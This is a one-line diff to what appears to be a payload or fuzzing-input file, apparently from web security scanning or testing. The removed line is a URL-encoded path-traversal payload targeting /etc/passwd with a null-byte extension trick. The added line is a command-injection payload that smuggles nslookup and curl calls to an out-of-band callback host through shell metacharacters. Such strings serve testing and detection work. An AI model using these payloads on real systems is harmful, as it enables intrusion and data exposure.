@@ -1,1 +1,1 @@
-..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.jpg
+&(nslookup -q=cname hitaykoyldbmlacafe.bxss.me||curl hitaykoyldbmlacafe.bxss.me)&'\"`0&(nslookup -q=cname hitaykoyldbmlacafe.bxss.me||curl hitaykoyldbmlacafe.bxss.me)&`'
